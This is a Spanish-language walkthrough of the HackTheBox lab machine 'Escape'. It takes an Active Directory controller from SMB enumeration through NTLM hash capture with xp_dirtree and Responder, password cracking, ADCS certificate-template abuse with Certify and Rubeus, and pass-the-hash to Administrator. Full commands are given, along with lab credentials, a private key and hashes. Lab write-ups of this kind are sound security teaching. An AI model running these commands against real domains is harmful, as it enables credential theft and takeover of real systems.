
```
Machine: Escape
Difficult: Medium
Platform: HackTheBox
Release: Released on 04/22/2023
```




### Reconocimiento: 


Antes de comenzar a explotar, debemos saber a qué nos enfrentamos. Recordemos que una enumeración adecuada garantiza una explotación eficaz.

En primer lugar, debemos tener en cuenta que las máquinas exponen sus servicios a través de puertos, por lo tanto, es importante conocer cuáles de ellos están disponibles (abiertos) en la máquina víctima.

Para ello utilizaremos la herramienta Nmap:

```
elswix@parrot$ nmap -p- --open -sS --min-rate 5000 -v -n -Pn 10.10.11.202 -oG portScan
```

Haré una breve explicación de para qué sirve cada parámetro que especificé:

"-p-" -> Indicamos a la herramienta que queremos hacer un escaneo de todos los puertos, es decir, desde el puerto 1 al 65535.

"--open" -> Indicamos que queremos filtrar por aquellos puertos que tengan un estado "open" (abiertos), ya que hay diferentes estados que no son del todo relevantes.

"-sS" -> Indicamos que queremos utilizar el modo de escaneo "TCP SYN Scan". Este parámetro permite agilizar el escaneo y reducir el ruido.

"--min-rate 5000" -> Indicamos la cantidad de paquetes por segundo que deseamos procesar, en este caso, "5000".

"-v" -> Indicamos que queremos utilizar el modo verbose, que nos permite ver los puertos abiertos a medida que se descubren durante el escaneo. Esto nos permite adelantar trabajo.

"-n" -> Indicamos que no queremos aplicar Resolución DNS.

"-Pn" -> Indicamos que no queremos aplicar Host Discovery.

"-oG" -> Indicamos que queremos exportar el resultado del escaneo en un formato grepeable, lo que nos permite filtrar la información más relevante utilizando expresiones regulares.


Resultado del escaneo:

```
Completed SYN Stealth Scan at 09:01, 26.70s elapsed (65535 total ports)
Nmap scan report for 10.10.11.202
Host is up (0.17s latency).
Not shown: 65515 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49687/tcp open  unknown
49688/tcp open  unknown
49708/tcp open  unknown
49712/tcp open  unknown
60035/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.82 seconds
           Raw packets sent: 131064 (5.767MB) | Rcvd: 34 (1.496KB)
```


Como podemos observar, hay una gran cantidad de puertos abiertos. Por esta razón, utilizamos el formato grepeable. La idea es formatear la información filtrando únicamente los puertos separados por comas. Luego, realizaremos un escaneo exhaustivo para identificar las tecnologías, servicios y versiones asociadas a puertos específicos.

Con este fin, crearemos una expresión regular que filtre la información del archivo en formato grepeable:

```
elswix@parrot$ cat portScan | grep 'Host: ' | grep -oP '\d{1,5}/open' | awk '{print $1}' FS="/" | xargs | tr ' ' ',' 

53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49687,49688,49708,49712,60035
```


Una vez que hayamos representado los puertos de la manera deseada, procederemos con el escaneo para reconocer las tecnologías, servicios y versiones que se ejecutan en dichos puertos.

```
elswix@parrot$ nmap -sCV -p53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49687,49688,49708,49712,60035 10.10.11.202 -oN fullScan
```


```
Nmap scan report for sequel.htb (10.10.11.202)
Host is up (0.34s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-06-25 21:22:47Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
|_ssl-date: 2023-06-25T21:24:23+00:00; +8h15m15s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-06-25T21:24:22+00:00; +8h15m15s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_ssl-date: 2023-06-25T21:24:23+00:00; +8h15m15s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-06-25T21:07:47
|_Not valid after:  2053-06-25T21:07:47
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-06-25T21:24:23+00:00; +8h15m15s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
|_ssl-date: 2023-06-25T21:24:24+00:00; +8h15m15s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49687/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49688/tcp open  msrpc         Microsoft Windows RPC
49708/tcp open  msrpc         Microsoft Windows RPC
49712/tcp open  msrpc         Microsoft Windows RPC
60035/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-06-25T21:23:44
|_  start_date: N/A
|_clock-skew: mean: 8h15m14s, deviation: 0s, median: 8h15m14s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 107.87 seconds
```



Tras inspeccionar los resultados del escaneo, parece ser que nos encontramos frente a un controlador de dominio, es decir, un entorno de Directorio Activo en Windows.

A primera vista, ya podemos identificar un dominio que agregaré de inmediato al archivo `/etc/hosts`.

```
elswix@parrot$ cat /etc/hosts
# Host addresses
127.0.0.1  localhost
127.0.1.1  Parrot
::1        localhost ip6-localhost ip6-loopback
ff02::1    ip6-allnodes
ff02::2    ip6-allrouters

# HackTheBox
10.10.11.202 sequel.htb dc.sequel.htb dc
```



### SMB - TCP 445


El puerto 445 corresponde al servicio SMB. Comenzaremos a realizar un reconocimiento de la máquina utilizando este servicio. Para ello, utilizaré inicialmente la herramienta [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec):

```
elswix@parrot$ crackmapexec smb 10.10.11.202
SMB         10.10.11.202    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
```

IYa teníamos la información relevante que buscábamos, que era el dominio.

El servicio SMB a veces expone recursos compartidos a nivel de red. Para acceder a estos recursos, generalmente se requiere el uso de credenciales válidas. Sin embargo, existen casos en los que se puede utilizar una sesión de invitado (Guest Session/Null Session).

La sesión de invitado o nula es un tipo de autenticación en la que no se solicita una contraseña para acceder. Solo se necesita ingresar un nombre de usuario. Es importante tener en cuenta que esto no siempre funciona, pero es una buena práctica intentarlo de todos modos.

Utilizaré la herramienta [smbmap](https://github.com/ShawnDEvans/smbmap) para escanear los recursos compartidos haciendo uso de una sesión de invitado.

```
elswix@parrot$ smbmap -H 10.10.11.202 -u 'test'
[+] Guest session   	IP: 10.10.11.202:445	Name: sequel.htb

Disk      	Permissions	  Comment
----      	-----------    -------
ADMIN$     	NO ACCESS	   Remote Admin
C$         	NO ACCESS      Default share
IPC$       	READ ONLY	   Remote IPC
NETLOGON   	NO ACCESS      Logon server share 
Public     	READ ONLY	
SYSVOL     	NO ACCESS      Logon server share 

```

Observamos que existe un recurso llamado "public" en el cual tenemos privilegios de lectura. Intentemos listar su contenido.
```
elswix@parrot$ smbmap -H 10.10.11.202 -u 'test' -r 'Public'
```

![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/ES/Machines/Medium/Escape/img/1.png?raw=true)


 Identificamos un archivo PDF dentro del directorio. Procederemos a descargarlo y a realizar una inspección para analizar su contenido.

```
elswix@parrot$ smbmap -H 10.10.11.202 -u 'test' -r 'Public' --download "Public/SQL Server Procedures.pdf"

[+] Starting download: Public\SQL Server Procedures.pdf (49551 bytes)
[+] File output to: ./10.10.11.202-Public_SQL Server Procedures.pdf
```

Podemos abrir el navegador y ingresar la ruta absoluta del archivo en nuestro sistema para visualizar su contenido.

![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/ES/Machines/Medium/Escape/img/2.png?raw=true)


Al leer el archivo, nos percatamos de que en la segunda página, al final, se encuentra información relevante.

![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/ES/Machines/Medium/Escape/img/3.png?raw=true)


Parece ser que se están filtrando credenciales. Voy a guardarlas en un archivo e intentar autenticarme en el servicio SMB utilizando estas:

```
PublicUser:GuestUserCantWrite1
```


Podemos verificar si las credenciales son correctas con la herramienta [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec):

```
crackmapexec smb 10.10.11.202 -u 'PublicUser' -p 'GuestUserCantWrite1'
```


![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/ES/Machines/Medium/Escape/img/4.png?raw=true)


Parece ser que las credenciales no son válidas para el servicio SMB. Sin embargo, dado que el PDF mencionaba que eran para acceder a la base de datos, intentaré utilizar la herramienta `mssqlclient` de [Impacket](https://github.com/SecureAuthCorp/impacket) para conectarme.

Voy a intentarlo nuevamente con las mismas credenciales:

```
elswix@parrot$ mssqlclient.py "sequel.htb/PublicUser@10.10.11.202"
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

Password: 
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL> 
```


En este punto, intenté utilizar `xp_cmdshell` para ejecutar comandos, pero no obtuve éxito. Se me ocurrió probar haciendo una solicitud SMB a un servidor alojado en mi máquina para obtener el hash Net-NTLMv2 del usuario administrador del servidor MSSQL.

Es importante tener en cuenta que, aunque estemos utilizando el usuario `PublicUser`, la solicitud a nivel de red será realizada por el administrador del servidor de Microsoft SQL. Por lo tanto, al ejecutar `xp_dirtree` en mi dirección IP, la solicitud será realizada por un usuario diferente al nuestro.

Con el fin de dirigir la solicitud a mi servidor, llevaré a cabo una técnica de envenenamiento del servicio SMB mediante responder:

```
elswix@parrot$ responder -I tun0

                                        __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.4]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-AFNXB8Z9RCY]
    Responder Domain Name      [GMQ6.LOCAL]
    Responder DCE-RPC Port     [46170]

[+] Listening for events...
```


Voy a ejecutar el siguiente comando en la consola interactiva obtenida con `mssqlclient`::

```
SQL> xp_dirtree "\\10.10.16.4\test"
```

  
Esperaremos unos segundos y, si todo va bien, el servidor de respuestas debería haber capturado la solicitud.:

```
[SMB] NTLMv2-SSP Client   : 10.10.11.202
[SMB] NTLMv2-SSP Username : sequel\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:0b63b108f4a834f8:8545469C3917EA7AF1954B38B72246F0:010100000000000000D0F5034AA7D901954F07D92C966FAF00000000020008003200370038005A0001001E00570049004E002D00440037003100360030005A004D00590047004500300004003400570049004E002D00440037003100360030005A004D0059004700450030002E003200370038005A002E004C004F00430041004C00030014003200370038005A002E004C004F00430041004C00050014003200370038005A002E004C004F00430041004C000700080000D0F5034AA7D90106000400020000000800300030000000000000000000000000300000D94D6229FBB3E411964E8C154976D855F2D964620B4B3CE73032483DFA79F67B0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0034000000000000000000
```

Hemos logrado obtener el hash Net-NTLMv2 del usuario `sql_svc`. Ahora, la idea es almacenarlo en un archivo y realizar un ataque de fuerza bruta para intentar obtener la contraseña en texto plano.

```
elswix@parrot$ john -w:/usr/share/wordlists/rockyou.txt file
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
REGGIE1234ronnie (sql_svc)     
1g 0:00:00:19 DONE (2023-06-25 09:50) 0.05068g/s 542361p/s 542361c/s 542361C/s RENZOJAVIER..REDMAN69
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

Perfecto, hemos obtenido la contraseña en un formato legible y ahora podemos intentar utilizarla para autenticarnos mediante SMB.

```
User: sql_svc
Password: REGGIE1234ronnie
```

Nuevamente, utilizaremos la herramienta [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec):

```
crackmapexec smb 10.10.11.202 -u 'sql_svc' -p 'REGGIE1234ronnie'
```

![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/ES/Machines/Medium/Escape/img/5.png?raw=true)

Las credenciales son válidas para SMB. Podemos verificar si el usuario `sql_svc` pertenece al grupo "Remote Management Users" para que, con herramientas como `Evil-WinRM`, podamos conectarnos al servicio de administración remota de Windows:

```
crackmapexec winrm 10.10.11.202 -u 'sql_svc' -p 'REGGIE1234ronnie'
```

![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/ES/Machines/Medium/Escape/img/6.png?raw=true)

Como las credenciales son válidas y el usuario `sql_svc` pertenece al grupo "Remote Management Users", podemos intentar conectarnos al servicio WinRM utilizando la herramienta `Evil-WinRM`. Esto nos permitirá obtener una consola interactiva como el usuario `sql_svc`.

```
elswix@parrot$ evil-winrm -i 10.10.11.202 -u 'sql_svc' -p 'REGGIE1234ronnie'

*Evil-WinRM* PS C:\Users\sql_svc\Documents> 
```

Accedimos al sistema de forma exitosa.


#### Shell as Ryan.Cooper:

Mientras enumeramos el sistema, descubrimos una carpeta llamada "SQLServer" en la raíz del sistema.

```
*Evil-WinRM* PS C:\> ls 


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/1/2023   8:15 PM                PerfLogs
d-r---         2/6/2023  12:08 PM                Program Files
d-----       11/19/2022   3:51 AM                Program Files (x86)
d-----       11/19/2022   3:51 AM                Public
d-----         2/1/2023   1:02 PM                SQLServer
d-r---         2/1/2023   1:55 PM                Users
d-----         2/6/2023   7:21 AM                Windows
```

Al listar el contenido de la carpeta, podemos observar que hay una subcarpeta llamada "Logs". Dentro de esta carpeta, encontramos un archivo llamado "ERRORLOG.BAK".

```
*Evil-WinRM* PS C:\SQLServer\Logs> ls


    Directory: C:\SQLServer\Logs


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         2/7/2023   8:06 AM          27608 ERRORLOG.BAK


*Evil-WinRM* PS C:\SQLServer\Logs> 
```


Al examinar el contenido del archivo "ERRORLOG.BAK", podemos observar que almacena registros de errores que han ocurrido en el servidor SQL. Además, podemos notar que alguien ha intentado autenticarse con el usuario "Ryan.Cooper".

![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/ES/Machines/Medium/Escape/img/7.png?raw=true)

  
También, unas líneas más abajo, podemos ver que ha habido intentos de autenticación con el usuario "NuclearMosquito3". El nombre de usuario es algo sospechoso. Decidí probar autenticarme al servicio SMB utilizando el usuario "Ryan.Cooper" y utilicé "NuclearMosquito3" como contraseña.

```
crackmapexec smb 10.10.11.202 -u 'Ryan.Cooper' -p 'NuclearMosquito3'
```

![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/ES/Machines/Medium/Escape/img/8.png?raw=true)

Las credenciales son correctas y el usuario "Ryan.Cooper" también tiene acceso al servicio WinRM. Por lo tanto, utilizando nuevamente la herramienta Evil-WinRM, podemos intentar conectarnos.

```
elswix@parrot$ evil-winrm -i 10.10.11.202 -u 'Ryan.Cooper' -p 'NuclearMosquito3'

*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents>
```


### Shell as Administrator

Hemos identificado el servicio ADCS (Active Directory Certificate Services). Siempre es importante investigar los servicios de Active Directory Certificate Services en un dominio. Podemos intentar hacerlo utilizando la herramienta `crackmapexec`

Cabe recalcar que tuve ciertos problemas con OpenSSL para ejecutar este modo de reconocimiento, por lo cuál tuve que instalar una versión personalizada de crackmapexec acompañado de un entorno virtual de python. 

```
crackmapexec ldap 10.10.11.202 -u 'Ryan.Cooper' -p 'NuclearMosquito3' -M adcs
```

![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/ES/Machines/Medium/Escape/img/10.png?raw=true)


Una vez que sabemos que ADCS está en funcionamiento, debemos identificar si hay alguna configuración insegura en alguna de las plantillas. Para hacerlo, haremos uso de `Certify.exe`. Este archivo ejecutable lo obtuve del repositorio [SharpCollection](https://github.com/Flangvik/SharpCollection) en GitHub.

Específicamente, utilicé la versión que se encuentra en la carpeta [NetFramework_4.5_Any](https://github.com/Flangvik/SharpCollection/tree/master/NetFramework_4.5_Any).

La idea es subir el archivo ejecutable a la máquina víctima. Para ello, podemos utilizar la función "upload" de Evil-WinRM.

```
upload /home/elswix/Desktop/elswix/HTB/Escape/content/Certify.exe
```

```
*Evil-WinRM* PS C:\Windows\Temp\Privesc> upload /home/elswix/Desktop/elswix/HTB/Escape/content/Certify.exe

Info: Uploading Certify.exe to C:\Windows\Temp\Privesc\Certify.exe

Data: 236200 bytes of 236200 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\Windows\Temp\Privesc> 
```

Ahora debemos buscar plantillas vulnerables, lo cual podemos hacer de la siguiente manera:

```
./Certify.exe find /vulnerable /currentuser
```

![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/ES/Machines/Medium/Escape/img/11.png?raw=true)

Podemos ver que se encontró una plantilla vulnerable llamada "UserAuthentication".

Con esta información, podemos ejecutar el siguiente comando utilizando `Certify.exe` y pasando ciertos parámetros:

```
.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator 
```

En este comando, básicamente estamos solicitando un certificado basado en el nombre del usuario que queremos suplantar.

Guardamos las claves que devuelve el comando según su tipo. Es decir, la clave privada se guarda en un archivo .key, mientras que la clave pública, que en realidad es un certificado, se guarda en un archivo .pem.

```
elswix@parrot$ cat private.key
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA4p7W/UJGTpymQtvqptr7MCrinEfitT2MRnvcKdOzE7BWAV84
WwxdkWuYQCEe5lbgnyxlCNDd5DjIvS57KANnpjQHWSjxN2ORQGqegerXCCx66L8J
5D7ZNipMZ01tE6VioKbNMea5fvGLYgB1/L9maiaKJetPaz4+RrsFXSvbN1ZQ0eqm
y0P2kljCstUGwRO6oFyQFqYp742/DsDEknqSlnQSZ3aTCB6YKa+R3/+W4T+ZmoPG
0v891XbNfywaHBX9DYGudzDWl5HHqAJmwRWHaTaVhzB74k+UJlOHiTzBqFSQT18G
paoUo/QcPxnNHq50GFG/+abr8RH49Sqc58gu5QIDAQABAoIBAAibUbzynGr15haZ
9ZJ6tJmCt3KKBGEvwjkXESiBgsaXptyMej5y/Ma+GF0vJNZIrGU/MWMhU5wMUAtn
TYQahQA576GCPY8F+AlDQ1vZyGrmDZDzWHPTszosZxRxS1g4qsNBMn/XrGnW0J1b
OR/tQP19EzgXdL+08HaNOcntFXlHeqSm8RZl0pvBLRYd1WFvKkUKW21v5mkz51FG
sEfBSdH7cZ7kWuHoGtHgfTFnCnyYHhUCKzUflM4W0T79TZM6C8v5VGF6e6wlmTyV
Gn0PddOmRphQJ+KqqIHUJxL388FmDa39dng38uXs77vclZ0qyA8NjxyISgCJ6qDB
//8F0E0CgYEA8SYmGb5hc/RT61Q5swgmuwjKYTn4wWUAyTOq0+4IqQH7R1wRRIn+
fnwYtQeBWxw4/EB0G+91lUgEYxUQzIPNZph0Pesw8USdZrfXUKSVpVRVAaQMqXfK
4k8tqqziYtCfEJGC05JQqgFYEQE9tpt3IYSztFo96ZDMWJslpGi28acCgYEA8JOj
3uLTzTqVKObKsOEVwir/QvB+hfJL53AeURKKpAYYxQtl8mmot3SuGaSHS7/SMXJP
AKNGz8XzqreZ20VsYMQiE5aBKnqguFgeBE0NHH2TE3d6m+wo1FlKl1HpKIAZJ7IE
eG5UrF7zF5rOQbx23LmBpCTEzTgQo+HSs3retJMCgYEAjTj2HyVrFOkFLE/K6pnf
dLEVNBMrJrbr2uizJiHEWJWcfpHgWu8lZxVtsraOfrjsdm2YkbOOfLoMN6piiCK3
61lk2c4ef2zbcQhAxC1epc/ZaHiWIbjRy+7qo4VTnuLmBGHy58xMCQN4e5zqc0Jg
ZfS8+OXQVDREN6/EP6BDYwkCgYEAuiYjSFVO+Z/4xns+HvsrMODAPvWDkPVYki4I
50ZnjF9DT0Rwj8/9wmZASIssPQqiA6ylQKMWKbLLxi7ml+nx4DYi//EW5N2Z+soD
/+P23zKzWP68GmXzecvVkZzJwpLL5BE0sFL+pZmak4svSWIgvs2zaGUi+oAFMCmO
NV4/cI0CgYBalqQDumy56mO4ff7h03wD5fwWOS+VfB8wAijmtR1g5FP7hY645JbA
8Bnx9vsNx4D89DBCn2VjleCGc0JagjsZhvotMjwVqFhA61kNCZ+7GEykoEAgdkoF
//06DTGg/NjyYWstCCe5DLst1nGQYyYfAU3uSQvAibj3BemZhu211w==
-----END RSA PRIVATE KEY-----
```

```
elswix@parrot$ cat cert.pem
-----BEGIN CERTIFICATE-----
MIIGEjCCBPqgAwIBAgITHgAAAApmSQbdZ0g+nQAAAAAACjANBgkqhkiG9w0BAQsF
ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjMwNjI1MjMxNjAzWhcNMjUwNjI1
MjMyNjAzWjBTMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYG
c2VxdWVsMQ4wDAYDVQQDEwVVc2VyczEUMBIGA1UEAxMLUnlhbi5Db29wZXIwggEi
MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDintb9QkZOnKZC2+qm2vswKuKc
R+K1PYxGe9wp07MTsFYBXzhbDF2Ra5hAIR7mVuCfLGUI0N3kOMi9LnsoA2emNAdZ
KPE3Y5FAap6B6tcILHrovwnkPtk2KkxnTW0TpWKgps0x5rl+8YtiAHX8v2ZqJool
609rPj5GuwVdK9s3VlDR6qbLQ/aSWMKy1QbBE7qgXJAWpinvjb8OwMSSepKWdBJn
dpMIHpgpr5Hf/5bhP5mag8bS/z3Vds1/LBocFf0Nga53MNaXkceoAmbBFYdpNpWH
MHviT5QmU4eJPMGoVJBPXwalqhSj9Bw/Gc0ernQYUb/5puvxEfj1KpznyC7lAgMB
AAGjggLsMIIC6DA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3FQiHq/N2hdymVof9
lTWDv8NZg4nKNYF338oIhp7sKQIBZAIBBTApBgNVHSUEIjAgBggrBgEFBQcDAgYI
KwYBBQUHAwQGCisGAQQBgjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcV
CgQoMCYwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkq
hkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYF
Kw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFPpbeu5bjpU/uMHIGIsWv2pTibBF
MCgGA1UdEQQhMB+gHQYKKwYBBAGCNxQCA6APDA1BZG1pbmlzdHJhdG9yMB8GA1Ud
IwQYMBaAFGKfMqOg8Dgg1GDAzW3F+lEwXsMVMIHEBgNVHR8EgbwwgbkwgbaggbOg
gbCGga1sZGFwOi8vL0NOPXNlcXVlbC1EQy1DQSxDTj1kYyxDTj1DRFAsQ049UHVi
bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
bixEQz1zZXF1ZWwsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFz
ZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvQYIKwYBBQUHAQEE
gbAwga0wgaoGCCsGAQUFBzAChoGdbGRhcDovLy9DTj1zZXF1ZWwtREMtQ0EsQ049
QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNv
bmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/
b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsF
AAOCAQEAhw1QMnM+bOXjhslU/I2JLDcjrTKxlzkmONeHmQcj1ihl2Eo+4wblJbfj
3xaMu2pk5SxWWnl3qYz5lbg62rfJaQWf/UQqFZ5hU3piT4H075pOJb7V1MQGyx/W
NPB3Ya61DO7clWjiBgqBa9/6EeyunZq7wdyba4RCjFtszyOaWXRjEke50/s12ns8
i/7oWqLeFXKqFCbqvLZ/NmcCDQL81OeDkpzAqlXDOKV7ahNVKd7d0heTsaWU2NCp
1qdbN8hGE+4OZCQ64XOz/nFJpD6/oVmYEZEF3z8B9YKOTAW9uUo33wxHN5kTwjxi
WV6ij+c2FzHM+gDsMhFkpSP0AIXm7w==
-----END CERTIFICATE-----
```


Con esta información, podemos ejecutar el siguiente comando para obtener un resultado similar al comando ejecutado con `Certify.exe`:

```
openssl pkcs12 -in cert.pem -inkey private.key -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

Hemos creado un certificado sin asignarle ninguna contraseña, por lo que no está protegido.

Una vez hecho esto, subimos el archivo cert.pfx a la máquina víctima. Además, también subimos el archivo binario "Rubeus.exe" que lo puedes encontrar en el mismo repositorio que "Certify.exe".


```
upload /home/elswix/Desktop/elswix/HTB/Escape/content/cert.pfx
upload /home/elswix/Desktop/elswix/HTB/Escape/content/Rubeus.exe
```


En la máquina víctima, ejecutamos Rubeus indicándole el usuario que deseamos suplantar y el certificado que obtuvimos:

```
.\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials
```


Finalmente, obtenemos el hash NTLM del usuario Administrator:

```
[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : A52F78E4C751E5F5E17E1E9F3E58F4EE
```


Este tipo de hash se puede utilizar para realizar el ataque Pass-the-Hash, lo que significa que podemos usar el hash para autenticarnos sin necesidad de ingresar una contraseña. Verifiquemos si funciona con crackmapexec:

```
crackmapexec smb 10.10.11.202 -u 'Administrator' -H 'A52F78E4C751E5F5E17E1E9F3E58F4EE'
```

![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/ES/Machines/Medium/Escape/img/12.png?raw=true)

Dado que el usuario es Administrator, podemos acceder al sistema utilizando Evil-WinRM pasándole directamente el hash, lo que nos permitirá acceder al sistema como este usuario.

```
